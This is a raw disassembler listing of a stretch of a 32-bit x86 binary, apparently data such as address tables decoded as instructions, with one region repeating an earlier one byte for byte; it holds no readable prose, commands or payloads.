  41d017:	add    BYTE PTR [eax-0x27],bl
  41d01a:	add    DWORD PTR [eax],eax
  41d01c:	(bad)  
  41d01d:	fld    DWORD PTR [ecx]
  41d01f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d023:	add    BYTE PTR [eax-0x27],bh
  41d026:	add    DWORD PTR [eax],eax
  41d028:	sbb    cl,0x1
  41d02b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d031:	fld    DWORD PTR [ecx]
  41d033:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d039:	fld    DWORD PTR [ecx]
  41d03b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d042:	add    DWORD PTR [eax],eax
  41d044:	rcr    cl,1
  41d046:	add    DWORD PTR [eax],eax
  41d048:	loopne 0x41d023
  41d04a:	add    DWORD PTR [eax],eax
  41d04c:	jmp    0x1d9:0xf80001d9
  41d053:	add    BYTE PTR [edx+ebx*8],al
  41d056:	add    DWORD PTR [eax],eax
  41d058:	push   cs
  41d059:	fiadd  DWORD PTR [ecx]
  41d05b:	add    BYTE PTR [edx],bl
  41d05d:	fiadd  DWORD PTR [ecx]
  41d05f:	add    BYTE PTR [edx+ebx*8],ah
  41d062:	add    DWORD PTR [eax],eax
  41d064:	fiadd  DWORD PTR cs:[ecx]
  41d067:	add    BYTE PTR [eax],bh
  41d069:	fiadd  DWORD PTR [ecx]
  41d06b:	add    BYTE PTR [eax-0x26],al
  41d06e:	add    DWORD PTR [eax],eax
  41d070:	dec    esi
  41d071:	fiadd  DWORD PTR [ecx]
  41d073:	add    BYTE PTR [eax-0x26],bl
  41d076:	add    DWORD PTR [eax],eax
  41d078:	fiadd  DWORD PTR fs:[ecx]
  41d07b:	add    BYTE PTR [esi-0x26],ch
  41d07e:	add    DWORD PTR [eax],eax
  41d080:	js     0x41d05c
  41d082:	add    DWORD PTR [eax],eax
  41d084:	xchg   dl,bl
  41d086:	add    DWORD PTR [eax],eax
  41d088:	mov    ds,edx
  41d08a:	add    DWORD PTR [eax],eax
  41d08c:	call   0x1da:0xa40001da
  41d093:	add    BYTE PTR [esi-0x47fffe26],ch
  41d099:	fiadd  DWORD PTR [ecx]
  41d09b:	add    ah,cl
  41d09d:	fiadd  DWORD PTR [ecx]
  41d09f:	add    ah,bl
  41d0a1:	fiadd  DWORD PTR [ecx]
  41d0a3:	add    al,ch
  41d0a5:	fiadd  DWORD PTR [ecx]
  41d0a7:	add    dl,dh
  41d0a9:	fiadd  DWORD PTR [ecx]
  41d0ab:	add    ah,bh
  41d0ad:	fiadd  DWORD PTR [ecx]
  41d0af:	add    BYTE PTR [eax],al
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    BYTE PTR [edx],dl
  41d0b5:	fild   DWORD PTR [ecx]
  41d0b7:	add    BYTE PTR [eax],dh
  41d0b9:	fild   DWORD PTR [ecx]
  41d0bb:	add    BYTE PTR [eax-0x25],cl
  41d0be:	add    DWORD PTR [eax],eax
  41d0c0:	push   0x7a0001db
  41d0c5:	fild   DWORD PTR [ecx]
  41d0c7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d0cd:	fild   DWORD PTR [ecx]
  41d0cf:	add    dl,al
  41d0d1:	fild   DWORD PTR [ecx]
  41d0d3:	add    dh,dl
  41d0d5:	fild   DWORD PTR [ecx]
  41d0d7:	add    dh,ah
  41d0d9:	fild   DWORD PTR [ecx]
  41d0db:	add    BYTE PTR [edx],al
  41d0dd:	fadd   QWORD PTR [ecx]
  41d0df:	add    BYTE PTR [esp+ebx*8],bl
  41d0e2:	add    DWORD PTR [eax],eax
  41d0e4:	sub    al,0xdc
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	cmp    bl,ah
  41d0ea:	add    DWORD PTR [eax],eax
  41d0ec:	dec    esi
  41d0ed:	fadd   QWORD PTR [ecx]
  41d0ef:	add    BYTE PTR [edx-0x24],bl
  41d0f2:	add    DWORD PTR [eax],eax
  41d0f4:	data16 fadd QWORD PTR [ecx]
  41d0f7:	add    BYTE PTR [eax-0x24],bh
  41d0fa:	add    DWORD PTR [eax],eax
  41d0fc:	mov    bl,ah
  41d0fe:	add    DWORD PTR [eax],eax
  41d100:	pushf  
  41d101:	fadd   QWORD PTR [ecx]
  41d103:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d109:	fadd   QWORD PTR [ecx]
  41d10b:	add    ah,cl
  41d10d:	fadd   QWORD PTR [ecx]
  41d10f:	add    al,ah
  41d111:	fadd   QWORD PTR [ecx]
  41d113:	add    ah,dh
  41d115:	fadd   QWORD PTR [ecx]
  41d117:	add    BYTE PTR [esi],al
  41d119:	fld    QWORD PTR [ecx]
  41d11b:	add    BYTE PTR [esi],dl
  41d11d:	fld    QWORD PTR [ecx]
  41d11f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d126:	add    DWORD PTR [eax],eax
  41d128:	dec    edx
  41d129:	fld    QWORD PTR [ecx]
  41d12b:	add    BYTE PTR [eax-0x23],bl
  41d12e:	add    DWORD PTR [eax],eax
  41d130:	pusha  
  41d131:	fld    QWORD PTR [ecx]
  41d133:	add    BYTE PTR [esi-0x23],ch
  41d136:	add    DWORD PTR [eax],eax
  41d138:	test   ch,bl
  41d13a:	add    DWORD PTR [eax],eax
  41d13c:	mov    ds,ebp
  41d13e:	add    DWORD PTR [eax],eax
  41d140:	sahf   
  41d141:	fld    QWORD PTR [ecx]
  41d143:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d14a:	add    DWORD PTR [eax],eax
  41d14c:	fcmovu st,st(5)
  41d14e:	add    DWORD PTR [eax],eax
  41d150:	out    dx,al
  41d151:	fld    QWORD PTR [ecx]
  41d153:	add    ah,bh
  41d155:	fld    QWORD PTR [ecx]
  41d157:	add    BYTE PTR [eax],cl
  41d159:	fiadd  WORD PTR [ecx]
  41d15b:	add    BYTE PTR [eax],ah
  41d15d:	fiadd  WORD PTR [ecx]
  41d15f:	add    BYTE PTR [edx],dh
  41d161:	fiadd  WORD PTR [ecx]
  41d163:	add    BYTE PTR [edx-0x22],cl
  41d166:	add    DWORD PTR [eax],eax
  41d168:	pop    esp
  41d169:	fiadd  WORD PTR [ecx]
  41d16b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d16f:	add    BYTE PTR [edx-0x71fffe22],al
  41d175:	fiadd  WORD PTR [ecx]
  41d177:	add    BYTE PTR [edx+0x1de],ah
  41d17d:	add    BYTE PTR [eax],al
  41d17f:	add    al,al
  41d181:	fiadd  WORD PTR [ecx]
  41d183:	add    dl,cl
  41d185:	fiadd  WORD PTR [ecx]
  41d187:	add    ah,dl
  41d189:	fiadd  WORD PTR [ecx]
  41d18b:	add    al,ah
  41d18d:	fiadd  WORD PTR [ecx]
  41d18f:	add    ah,dh
  41d191:	fiadd  WORD PTR [ecx]
  41d193:	add    BYTE PTR [eax],al
  41d195:	fild   WORD PTR [ecx]
  41d197:	add    BYTE PTR [edx],bl
  41d199:	fild   WORD PTR [ecx]
  41d19b:	add    BYTE PTR [edx],ch
  41d19d:	fild   WORD PTR [ecx]
  41d19f:	add    BYTE PTR [eax],bh
  41d1a1:	fild   WORD PTR [ecx]
  41d1a3:	add    BYTE PTR [eax-0x21],dl
  41d1a6:	add    DWORD PTR [eax],eax
  41d1a8:	fild   WORD PTR fs:[ecx]
  41d1ab:	add    BYTE PTR [esi-0x21],bh
  41d1ae:	add    DWORD PTR [eax],eax
  41d1b0:	mov    edi,ds
  41d1b2:	add    DWORD PTR [eax],eax
  41d1b4:	cwde   
  41d1b5:	fild   WORD PTR [ecx]
  41d1b7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d1bd:	fild   WORD PTR [ecx]
  41d1bf:	add    dh,al
  41d1c1:	fild   WORD PTR [ecx]
  41d1c3:	add    dh,dl
  41d1c5:	fild   WORD PTR [ecx]
  41d1c7:	add    dh,ah
  41d1c9:	fild   WORD PTR [ecx]
  41d1cb:	add    ah,bh
  41d1cd:	fild   WORD PTR [ecx]
  41d1cf:	add    BYTE PTR [eax],cl
  41d1d1:	loopne 0x41d1d4
  41d1d3:	add    BYTE PTR [eax+eiz*8],dl
  41d1d6:	add    DWORD PTR [eax],eax
  41d1d8:	sub    al,ah
  41d1da:	add    DWORD PTR [eax],eax
  41d1dc:	ds loopne 0x41d1e0
  41d1df:	add    BYTE PTR [esi-0x20],dl
  41d1e2:	add    DWORD PTR [eax],eax
  41d1e4:	data16 loopne 0x41d1e8
  41d1e7:	add    BYTE PTR [edx-0x20],dh
  41d1ea:	add    DWORD PTR [eax],eax
  41d1ec:	xchg   al,ah
  41d1ee:	add    DWORD PTR [eax],eax
  41d1f0:	xchg   esp,eax
  41d1f1:	loopne 0x41d1f4
  41d1f3:	add    BYTE PTR [esi-0x47fffe20],ch
  41d1f9:	loopne 0x41d1fc
  41d1fb:	add    dl,cl
  41d1fd:	loopne 0x41d200
  41d1ff:	add    ah,bl
  41d201:	loopne 0x41d204
  41d203:	add    dh,ch
  41d205:	loopne 0x41d208
  41d207:	add    dh,bh
  41d209:	loopne 0x41d20c
  41d20b:	add    BYTE PTR [eax],cl
  41d20d:	loope  0x41d210
  41d20f:	add    BYTE PTR [esi],bl
  41d211:	loope  0x41d214
  41d213:	add    BYTE PTR [edx],dh
  41d215:	loope  0x41d218
  41d217:	add    BYTE PTR [esi-0x1f],al
  41d21a:	add    DWORD PTR [eax],eax
  41d21c:	push   esi
  41d21d:	loope  0x41d220
  41d21f:	add    BYTE PTR [esi-0x1f],ah
  41d222:	add    DWORD PTR [eax],eax
  41d224:	jb     0x41d207
  41d226:	add    DWORD PTR [eax],eax
  41d228:	test   cl,ah
  41d22a:	add    DWORD PTR [eax],eax
  41d22c:	mov    al,ds:0xb60001e1
  41d231:	loope  0x41d234
  41d233:	add    dl,al
  41d235:	loope  0x41d238
  41d237:	add    dh,dl
  41d239:	loope  0x41d23c
  41d23b:	add    BYTE PTR [eax],al
  41d23d:	add    BYTE PTR [eax],al
  41d23f:	add    ah,dh
  41d241:	loope  0x41d244
  41d243:	add    BYTE PTR [edx+eiz*8],al
  41d246:	add    DWORD PTR [eax],eax
  41d248:	adc    al,0xe2
  41d24a:	add    DWORD PTR [eax],eax
  41d24c:	and    ah,dl
  41d24e:	add    DWORD PTR [eax],eax
  41d250:	xor    dl,ah
  41d252:	add    DWORD PTR [eax],eax
  41d254:	ds loop 0x41d258
  41d257:	add    BYTE PTR [edx-0x1e],dl
  41d25a:	add    DWORD PTR [eax],eax
  41d25c:	pusha  
  41d25d:	loop   0x41d260
  41d25f:	add    BYTE PTR [edx-0x1e],bh
  41d262:	add    DWORD PTR [eax],eax
  41d264:	xchg   dl,ah
  41d266:	add    DWORD PTR [eax],eax
  41d268:	cwde   
  41d269:	loop   0x41d26c
  41d26b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d272:	add    DWORD PTR [eax],eax
  41d274:	int3   
  41d275:	loop   0x41d278
  41d277:	add    dh,dl
  41d279:	loop   0x41d27c
  41d27b:	add    al,ah
  41d27d:	loop   0x41d280
  41d27f:	add    dl,bh
  41d281:	loop   0x41d284
  41d283:	add    BYTE PTR [edx],cl
  41d285:	jecxz  0x41d288
  41d287:	add    BYTE PTR [edx],bl
  41d289:	jecxz  0x41d28c
  41d28b:	add    BYTE PTR [ebx+eiz*8],ah
  41d28e:	add    DWORD PTR [eax],eax
  41d290:	xor    al,0xe3
  41d292:	add    DWORD PTR [eax],eax
  41d294:	inc    eax
  41d295:	jecxz  0x41d298
  41d297:	add    BYTE PTR [esi-0x1d],cl
  41d29a:	add    DWORD PTR [eax],eax
  41d29c:	fs jecxz 0x41d2a0
  41d29f:	add    BYTE PTR [esi-0x1d],dh
  41d2a2:	add    DWORD PTR [eax],eax
  41d2a4:	mov    fs,ebx
  41d2a6:	add    DWORD PTR [eax],eax
  41d2a8:	mov    ds:0xb00001e3,al
  41d2ad:	jecxz  0x41d2b0
  41d2af:	add    dl,al
  41d2b1:	jecxz  0x41d2b4
  41d2b3:	add    dh,cl
  41d2b5:	jecxz  0x41d2b8
  41d2b7:	add    dh,bl
  41d2b9:	jecxz  0x41d2bc
  41d2bb:	add    ah,ch
  41d2bd:	jecxz  0x41d2c0
  41d2bf:	add    BYTE PTR [eax],al
  41d2c1:	in     al,0x1
  41d2c3:	add    BYTE PTR [esi],cl
  41d2c5:	in     al,0x1
  41d2c7:	add    BYTE PTR [edx],ch
  41d2c9:	in     al,0x1
  41d2cb:	add    BYTE PTR [esp+eiz*8],bh
  41d2ce:	add    DWORD PTR [eax],eax
  41d2d0:	dec    esp
  41d2d1:	in     al,0x1
  41d2d3:	add    BYTE PTR [esi-0x1c],bl
  41d2d6:	add    DWORD PTR [eax],eax
  41d2d8:	push   0xffffffe4
  41d2da:	add    DWORD PTR [eax],eax
  41d2dc:	jl     0x41d2c2
  41d2de:	add    DWORD PTR [eax],eax
  41d2e0:	mov    ah,ah
  41d2e2:	add    DWORD PTR [eax],eax
  41d2e4:	cwde   
  41d2e5:	in     al,0x1
  41d2e7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d2ed:	in     al,0x1
  41d2ef:	add    al,dl
  41d2f1:	in     al,0x1
  41d2f3:	add    dl,ah
  41d2f5:	in     al,0x1
  41d2f7:	add    al,dh
  41d2f9:	in     al,0x1
  41d2fb:	add    BYTE PTR [eax],cl
  41d2fd:	in     eax,0x1
  41d2ff:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d306:	add    DWORD PTR [eax],eax
  41d308:	ds in  eax,0x1
  41d30b:	add    BYTE PTR [edx-0x1b],cl
  41d30e:	add    DWORD PTR [eax],eax
  41d310:	pop    edx
  41d311:	in     eax,0x1
  41d313:	add    BYTE PTR [esi-0x1b],ch
  41d316:	add    DWORD PTR [eax],eax
  41d318:	jle    0x41d2ff
  41d31a:	add    DWORD PTR [eax],eax
  41d31c:	nop
  41d31d:	in     eax,0x1
  41d31f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d326:	add    DWORD PTR [eax],eax
  41d328:	mov    eax,0xca0001e5
  41d32d:	in     eax,0x1
  41d32f:	add    dl,bl
  41d331:	in     eax,0x1
  41d333:	add    dh,ah
  41d335:	in     eax,0x1
  41d337:	add    ah,bh
  41d339:	in     eax,0x1
  41d33b:	add    BYTE PTR [esi],cl
  41d33d:	out    0x1,al
  41d33f:	add    BYTE PTR [eax],ch
  41d341:	out    0x1,al
  41d343:	add    BYTE PTR [edx],bh
  41d345:	out    0x1,al
  41d347:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d34b:	add    BYTE PTR [eax-0x1a],bl
  41d34e:	add    DWORD PTR [eax],eax
  41d350:	push   0x7a0001e6
  41d355:	out    0x1,al
  41d357:	add    BYTE PTR [esi-0x67fffe1a],al
  41d35d:	out    0x1,al
  41d35f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d365:	out    0x1,al
  41d367:	add    ah,bl
  41d369:	out    0x1,al
  41d36b:	add    dl,ch
  41d36d:	out    0x1,al
  41d36f:	add    al,bh
  41d371:	out    0x1,al
  41d373:	add    BYTE PTR [esi],cl
  41d375:	out    0x1,eax
  41d377:	add    BYTE PTR [esi],bl
  41d379:	out    0x1,eax
  41d37b:	add    BYTE PTR [edx],ch
  41d37d:	out    0x1,eax
  41d37f:	add    BYTE PTR [edx],bh
  41d381:	out    0x1,eax
  41d383:	add    BYTE PTR [edx-0x19],cl
  41d386:	add    DWORD PTR [eax],eax
  41d388:	pop    esp
  41d389:	out    0x1,eax
  41d38b:	add    BYTE PTR [eax-0x19],ch
  41d38e:	add    DWORD PTR [eax],eax
  41d390:	jbe    0x41d379
  41d392:	add    DWORD PTR [eax],eax
  41d394:	xchg   bh,ah
  41d396:	add    DWORD PTR [eax],eax
  41d398:	cwde   
  41d399:	out    0x1,eax
  41d39b:	add    BYTE PTR [eax-0x45fffe19],ch
  41d3a1:	out    0x1,eax
  41d3a3:	add    al,dl
  41d3a5:	out    0x1,eax
  41d3a7:	add    dh,ah
  41d3a9:	out    0x1,eax
  41d3ab:	add    dh,dh
  41d3ad:	out    0x1,eax
  41d3af:	add    BYTE PTR [edx],al
  41d3b1:	call   0xe859d3b7
  41d3b6:	add    DWORD PTR [eax],eax
  41d3b8:	and    al,0xe8
  41d3ba:	add    DWORD PTR [eax],eax
  41d3bc:	xor    al,0xe8
  41d3be:	add    DWORD PTR [eax],eax
  41d3c0:	dec    eax
  41d3c1:	call   0xe897d3c7
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	callw  0xd3cd
  41d3cc:	jp     0x41d3b6
  41d3ce:	add    DWORD PTR [eax],eax
  41d3d0:	xchg   al,ch
  41d3d2:	add    DWORD PTR [eax],eax
  41d3d4:	xchg   esi,eax
  41d3d5:	call   0xe8e3d3db
  41d3da:	add    DWORD PTR [eax],eax
  41d3dc:	mov    dl,0xe8
  41d3de:	add    DWORD PTR [eax],eax
  41d3e0:	(bad)  
  41d3e1:	call   0xe913d3e7
  41d3e6:	add    DWORD PTR [eax],eax
  41d3e8:	in     al,0xe8
  41d3ea:	add    DWORD PTR [eax],eax
  41d3ec:	lock call 0xe93fd3f3
  41d3f2:	add    DWORD PTR [eax],eax
  41d3f4:	or     al,0xe9
  41d3f6:	add    DWORD PTR [eax],eax
  41d3f8:	sbb    ch,cl
  41d3fa:	add    DWORD PTR [eax],eax
  41d3fc:	add    BYTE PTR [eax],al
  41d3fe:	add    BYTE PTR [eax],al
  41d400:	or     al,0x2
  41d402:	add    BYTE PTR [eax+0x0],al
  41d408:	add    BYTE PTR [eax],al
  41d40a:	add    BYTE PTR [eax],al
  41d40c:	das    
  41d40d:	and    DWORD PTR [ecx*2+0x0],edx
  41d414:	add    al,BYTE PTR [eax]
  41d416:	add    BYTE PTR [eax],al
  41d418:	pop    ebp
  41d419:	add    BYTE PTR [eax],al
  41d41b:	add    BYTE PTR [ebp+ebp*4-0x604bfffe],dh
  41d422:	add    al,BYTE PTR [eax]
	...
  41d42c:	das    
  41d42d:	and    DWORD PTR [ecx*2+0x0],edx
  41d434:	pop    edx
  41d435:	aam    0x1
  41d437:	add    BYTE PTR [ecx],al
  41d439:	add    BYTE PTR [eax],al
  41d43b:	add    BYTE PTR [ecx],al
  41d43d:	add    BYTE PTR [eax],al
  41d43f:	add    BYTE PTR [ecx],al
  41d441:	add    BYTE PTR [eax],al
  41d443:	add    BYTE PTR [eax-0x2c],dl
  41d446:	add    DWORD PTR [eax],eax
  41d448:	push   esp
  41d449:	aam    0x1
  41d44b:	add    BYTE PTR [eax-0x2c],bl
  41d44e:	add    DWORD PTR [eax],eax
  41d450:	xchg   edi,eax
  41d451:	inc    ebx
  41d452:	add    BYTE PTR [eax],al
  41d454:	imul   edx,esp,0x1
  41d457:	add    BYTE PTR [eax],al
  41d459:	add    BYTE PTR [eax+ebp*2+0x58],ah
  41d45d:	xor    dl,BYTE PTR [eax+0x78]
  41d460:	jp     0x41d4aa
  41d462:	jp     0x41d4d5
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	je     0x41d495
  41d467:	je     0x41d4d2
  41d469:	jo     0x41d46b
  41d46b:	aas    
  41d46c:	dec    eax
  41d46d:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  41d475:	gs jb  0x41d4c7
  41d478:	jb     0x41d4e3
  41d47a:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  41d482:	inc    edi
  41d483:	inc    esi
  41d484:	dec    ebx
  41d485:	push   eax
  41d486:	inc    ecx
  41d487:	dec    ecx
  41d488:	push   eax
  41d489:	inc    ecx
  41d48a:	inc    esp
  41d48b:	cmp    al,0x56
	...
  41d495:	add    BYTE PTR [eax],al
  41d497:	add    BYTE PTR [eax],dl
  41d499:	aad    0x1
	...
  41d4a3:	add    BYTE PTR [esi],al
  41d4a5:	fild   DWORD PTR [ecx]
  41d4a7:	add    BYTE PTR [eax],al
  41d4a9:	rol    BYTE PTR [ecx],1
  41d4ab:	add    ah,al
  41d4ad:	aad    0x1
	...
  41d4b7:	add    BYTE PTR [edx-0x4bfffe22],dh
  41d4bd:	rol    BYTE PTR [ecx],1
  41d4bf:	add    BYTE PTR [eax+0x1d6],dl
  41d4c5:	add    BYTE PTR [eax],al
  41d4c7:	add    BYTE PTR [eax],al
  41d4c9:	add    BYTE PTR [eax],al
  41d4cb:	add    dl,ch
  41d4cd:	loope  0x41d4d0
  41d4cf:	add    BYTE PTR [eax+0x500001d1],al
  41d4d5:	xlat   BYTE PTR ds:[ebx]
  41d4d6:	add    DWORD PTR [eax],eax
	...
  41d4e0:	ss jmp 0xd281d4e7
  41d4e6:	add    DWORD PTR [eax],eax
  41d4e8:	adc    cl,bl
  41d4ea:	add    DWORD PTR [eax],eax
	...
  41d4f4:	inc    edx
  41d4f5:	jmp    0xd441d4fb
  41d4fa:	add    DWORD PTR [eax],eax
	...
  41d510:	sbb    cl,bl
  41d512:	add    DWORD PTR [eax],eax
  41d514:	fld    DWORD PTR es:[ecx]
  41d517:	add    BYTE PTR [eax],dh
  41d519:	fld    DWORD PTR [ecx]
  41d51b:	add    BYTE PTR [edx],bh
  41d51d:	fld    DWORD PTR [ecx]
  41d51f:	add    BYTE PTR [edx-0x27],al
  41d522:	add    DWORD PTR [eax],eax
  41d524:	dec    esp
  41d525:	fld    DWORD PTR [ecx]
  41d527:	add    BYTE PTR [eax-0x27],bl
  41d52a:	add    DWORD PTR [eax],eax
  41d52c:	(bad)  
  41d52d:	fld    DWORD PTR [ecx]
  41d52f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d533:	add    BYTE PTR [eax-0x27],bh
  41d536:	add    DWORD PTR [eax],eax
  41d538:	sbb    cl,0x1
  41d53b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d541:	fld    DWORD PTR [ecx]
  41d543:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d549:	fld    DWORD PTR [ecx]
  41d54b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d552:	add    DWORD PTR [eax],eax
  41d554:	rcr    cl,1
  41d556:	add    DWORD PTR [eax],eax
  41d558:	loopne 0x41d533
  41d55a:	add    DWORD PTR [eax],eax
  41d55c:	jmp    0x1d9:0xf80001d9
  41d563:	add    BYTE PTR [edx+ebx*8],al
  41d566:	add    DWORD PTR [eax],eax
  41d568:	push   cs
  41d569:	fiadd  DWORD PTR [ecx]
  41d56b:	add    BYTE PTR [edx],bl
  41d56d:	fiadd  DWORD PTR [ecx]
  41d56f:	add    BYTE PTR [edx+ebx*8],ah
  41d572:	add    DWORD PTR [eax],eax
  41d574:	fiadd  DWORD PTR cs:[ecx]
  41d577:	add    BYTE PTR [eax],bh
  41d579:	fiadd  DWORD PTR [ecx]
  41d57b:	add    BYTE PTR [eax-0x26],al
  41d57e:	add    DWORD PTR [eax],eax
  41d580:	dec    esi
  41d581:	fiadd  DWORD PTR [ecx]
  41d583:	add    BYTE PTR [eax-0x26],bl
  41d586:	add    DWORD PTR [eax],eax
  41d588:	fiadd  DWORD PTR fs:[ecx]
  41d58b:	add    BYTE PTR [esi-0x26],ch
  41d58e:	add    DWORD PTR [eax],eax
  41d590:	js     0x41d56c
  41d592:	add    DWORD PTR [eax],eax
  41d594:	xchg   dl,bl
  41d596:	add    DWORD PTR [eax],eax
  41d598:	mov    ds,edx
  41d59a:	add    DWORD PTR [eax],eax
  41d59c:	call   0x1da:0xa40001da
  41d5a3:	add    BYTE PTR [esi-0x47fffe26],ch
  41d5a9:	fiadd  DWORD PTR [ecx]
  41d5ab:	add    ah,cl
  41d5ad:	fiadd  DWORD PTR [ecx]
  41d5af:	add    ah,bl
  41d5b1:	fiadd  DWORD PTR [ecx]
  41d5b3:	add    al,ch
  41d5b5:	fiadd  DWORD PTR [ecx]
  41d5b7:	add    dl,dh
  41d5b9:	fiadd  DWORD PTR [ecx]
  41d5bb:	add    ah,bh
  41d5bd:	fiadd  DWORD PTR [ecx]
  41d5bf:	add    BYTE PTR [eax],al
  41d5c1:	add    BYTE PTR [eax],al
  41d5c3:	add    BYTE PTR [edx],dl
  41d5c5:	fild   DWORD PTR [ecx]
  41d5c7:	add    BYTE PTR [eax],dh
  41d5c9:	fild   DWORD PTR [ecx]
  41d5cb:	add    BYTE PTR [eax-0x25],cl
  41d5ce:	add    DWORD PTR [eax],eax
  41d5d0:	push   0x7a0001db
  41d5d5:	fild   DWORD PTR [ecx]
  41d5d7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d5dd:	fild   DWORD PTR [ecx]
  41d5df:	add    dl,al
  41d5e1:	fild   DWORD PTR [ecx]
  41d5e3:	add    dh,dl
  41d5e5:	fild   DWORD PTR [ecx]
  41d5e7:	add    dh,ah
  41d5e9:	fild   DWORD PTR [ecx]
  41d5eb:	add    BYTE PTR [edx],al
  41d5ed:	fadd   QWORD PTR [ecx]
  41d5ef:	add    BYTE PTR [esp+ebx*8],bl
  41d5f2:	add    DWORD PTR [eax],eax
  41d5f4:	sub    al,0xdc
  41d5f6:	add    DWORD PTR [eax],eax
  41d5f8:	cmp    bl,ah
  41d5fa:	add    DWORD PTR [eax],eax
  41d5fc:	dec    esi
  41d5fd:	fadd   QWORD PTR [ecx]
  41d5ff:	add    BYTE PTR [edx-0x24],bl
  41d602:	add    DWORD PTR [eax],eax
  41d604:	data16 fadd QWORD PTR [ecx]
  41d607:	add    BYTE PTR [eax-0x24],bh
  41d60a:	add    DWORD PTR [eax],eax
  41d60c:	mov    bl,ah
  41d60e:	add    DWORD PTR [eax],eax
  41d610:	pushf  
  41d611:	fadd   QWORD PTR [ecx]
  41d613:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d619:	fadd   QWORD PTR [ecx]
  41d61b:	add    ah,cl
  41d61d:	fadd   QWORD PTR [ecx]
  41d61f:	add    al,ah
  41d621:	fadd   QWORD PTR [ecx]
  41d623:	add    ah,dh
  41d625:	fadd   QWORD PTR [ecx]
  41d627:	add    BYTE PTR [esi],al
  41d629:	fld    QWORD PTR [ecx]
  41d62b:	add    BYTE PTR [esi],dl
  41d62d:	fld    QWORD PTR [ecx]
  41d62f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d636:	add    DWORD PTR [eax],eax
  41d638:	dec    edx
  41d639:	fld    QWORD PTR [ecx]
  41d63b:	add    BYTE PTR [eax-0x23],bl
  41d63e:	add    DWORD PTR [eax],eax
  41d640:	pusha  
  41d641:	fld    QWORD PTR [ecx]
  41d643:	add    BYTE PTR [esi-0x23],ch
  41d646:	add    DWORD PTR [eax],eax
  41d648:	test   ch,bl
  41d64a:	add    DWORD PTR [eax],eax
  41d64c:	mov    ds,ebp
  41d64e:	add    DWORD PTR [eax],eax
  41d650:	sahf   
  41d651:	fld    QWORD PTR [ecx]
  41d653:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d65a:	add    DWORD PTR [eax],eax
  41d65c:	fcmovu st,st(5)
  41d65e:	add    DWORD PTR [eax],eax
  41d660:	out    dx,al
  41d661:	fld    QWORD PTR [ecx]
  41d663:	add    ah,bh
  41d665:	fld    QWORD PTR [ecx]
  41d667:	add    BYTE PTR [eax],cl
  41d669:	fiadd  WORD PTR [ecx]
  41d66b:	add    BYTE PTR [eax],ah
  41d66d:	fiadd  WORD PTR [ecx]
  41d66f:	add    BYTE PTR [edx],dh
  41d671:	fiadd  WORD PTR [ecx]
  41d673:	add    BYTE PTR [edx-0x22],cl
  41d676:	add    DWORD PTR [eax],eax
  41d678:	pop    esp
  41d679:	fiadd  WORD PTR [ecx]
  41d67b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d67f:	add    BYTE PTR [edx-0x71fffe22],al
  41d685:	fiadd  WORD PTR [ecx]
  41d687:	add    BYTE PTR [edx+0x1de],ah
  41d68d:	add    BYTE PTR [eax],al
  41d68f:	add    al,al
  41d691:	fiadd  WORD PTR [ecx]
  41d693:	add    dl,cl
  41d695:	fiadd  WORD PTR [ecx]
  41d697:	add    ah,dl
  41d699:	fiadd  WORD PTR [ecx]
  41d69b:	add    al,ah
  41d69d:	fiadd  WORD PTR [ecx]
  41d69f:	add    ah,dh
  41d6a1:	fiadd  WORD PTR [ecx]
  41d6a3:	add    BYTE PTR [eax],al
  41d6a5:	fild   WORD PTR [ecx]
  41d6a7:	add    BYTE PTR [edx],bl
  41d6a9:	fild   WORD PTR [ecx]
  41d6ab:	add    BYTE PTR [edx],ch
  41d6ad:	fild   WORD PTR [ecx]
  41d6af:	add    BYTE PTR [eax],bh
  41d6b1:	fild   WORD PTR [ecx]
  41d6b3:	add    BYTE PTR [eax-0x21],dl
  41d6b6:	add    DWORD PTR [eax],eax
  41d6b8:	fild   WORD PTR fs:[ecx]
  41d6bb:	add    BYTE PTR [esi-0x21],bh
  41d6be:	add    DWORD PTR [eax],eax
  41d6c0:	mov    edi,ds
  41d6c2:	add    DWORD PTR [eax],eax
  41d6c4:	cwde   
  41d6c5:	fild   WORD PTR [ecx]
  41d6c7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d6cd:	fild   WORD PTR [ecx]
  41d6cf:	add    dh,al
  41d6d1:	fild   WORD PTR [ecx]
  41d6d3:	add    dh,dl
  41d6d5:	fild   WORD PTR [ecx]
  41d6d7:	add    dh,ah
  41d6d9:	fild   WORD PTR [ecx]
  41d6db:	add    ah,bh
  41d6dd:	fild   WORD PTR [ecx]
  41d6df:	add    BYTE PTR [eax],cl
  41d6e1:	loopne 0x41d6e4
  41d6e3:	add    BYTE PTR [eax+eiz*8],dl
  41d6e6:	add    DWORD PTR [eax],eax
  41d6e8:	sub    al,ah
  41d6ea:	add    DWORD PTR [eax],eax
